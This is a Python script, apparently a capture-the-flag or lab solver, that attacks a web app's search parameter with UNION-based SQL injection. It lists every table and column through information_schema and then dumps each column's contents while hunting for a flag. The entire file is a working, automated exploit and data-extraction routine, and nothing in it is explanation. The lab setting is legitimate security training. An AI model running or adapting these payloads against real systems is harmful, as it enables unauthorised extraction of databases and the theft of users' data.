import sys
from pathlib import Path
sys.path.append(str(Path(__file__).resolve().parent.parent))
from utils import get_session, find_flag

from bs4 import BeautifulSoup

BASE_URL = "https://bigapp.quoccacorp.com"

class Solver:
    def __init__(self):
        self.session = get_session()

    def execute_payload(self, union_payload: str):
        response = self.session.get(BASE_URL, params={"q": union_payload})
        find_flag(response.text)
        soup = BeautifulSoup(response.text, "html.parser")
        last_column_values = []

        for td in soup.select("tr td:last-child"):
            last_col_value: str = td.text.strip()
            if not last_col_value.isdigit():
                last_column_values.append(last_col_value)

        return last_column_values

    def _get_table_names(self) -> list[str]:
        return self.execute_payload("')) UNION SELECT 1, 2, 3, 4, 5, table_name, 6 FROM information_schema.tables; -- ")

    def _get_column_names(self, table_name: str):
        return self.execute_payload(f"')) UNION SELECT 1, 2, 3, 4, 5, column_name, 6 FROM information_schema.columns WHERE table_name = '{table_name}'; -- ")

    def main(self):
        for table_name in self._get_table_names():
            for column_name in self._get_column_names(table_name):
                self.execute_payload(f"')) UNION SELECT 1, 2, 3, 4, 5, {column_name}, 6 FROM {table_name}; -- ")

if __name__ == "__main__":
    Solver().main()